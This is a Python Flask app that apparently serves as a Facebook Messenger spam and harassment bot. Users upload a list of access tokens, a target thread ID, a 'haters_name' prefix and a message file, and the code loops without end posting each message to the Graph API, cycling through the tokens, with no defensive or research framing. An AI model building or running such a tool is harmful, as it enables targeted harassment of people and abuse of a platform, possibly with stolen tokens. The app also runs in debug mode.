from flask import Flask, render_template, request, jsonify
import threading, time, requests, os

app = Flask(__name__)

running = False
task_thread = None

def send_messages(config):
    global running
    running = True

    tokens = config["tokens"]
    convo_id = config["convo_id"]
    haters_name = config["haters_name"]
    delay = int(config["delay"])
    np_file = config["np_file"]

    if not os.path.exists(np_file):
        print(f"[x] Message file not found: {np_file}")
        return

    with open(np_file, "r", encoding="utf-8") as f:
        messages = [m.strip() for m in f.readlines() if m.strip()]

    count = 0
    while running:
        for i, msg in enumerate(messages):
            if not running:
                break
            token = tokens[i % len(tokens)]
            url = f"https://graph.facebook.com/v15.0/t_{convo_id}"
            payload = {"access_token": token, "message": f"{haters_name} {msg}"}
            r = requests.post(url, data=payload)
            count += 1
            print(f"[+] Sent {count}: {haters_name} {msg} | Status: {r.status_code}")
            time.sleep(delay)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/start", methods=["POST"])
def start_task():
    global task_thread, running
    if running:
        return jsonify({"status": "Already running!"})

    # Token select
    token_option = request.form.get("tokenOption")
    tokens = []
    if token_option == "single":
        single_token = request.form.get("singleToken")
        if single_token:
            tokens = [single_token.strip()]
    else:
        token_file = request.files.get("tokenFile")
        if token_file:
            content = token_file.read().decode("utf-8")
            tokens = [t.strip() for t in content.splitlines() if t.strip()]

    convo_id = request.form.get("threadId")
    haters_name = request.form.get("kidx")
    delay = request.form.get("time")

    # Save NP file
    txt_file = request.files.get("txtFile")
    np_path = "np_file.txt"
    if txt_file:
        txt_file.save(np_path)

    config = {
        "tokens": tokens,
        "convo_id": convo_id,
        "haters_name": haters_name,
        "delay": delay,
        "np_file": np_path
    }

    task_thread = threading.Thread(target=send_messages, args=(config,))
    task_thread.start()

    return jsonify({"status": "Task started successfully"})

@app.route("/stop", methods=["POST"])
def stop_task():
    global running
    running = False
    return jsonify({"status": "Task stopped"})

if __name__ == "__main__":
    app.run(debug=True, port=5000)
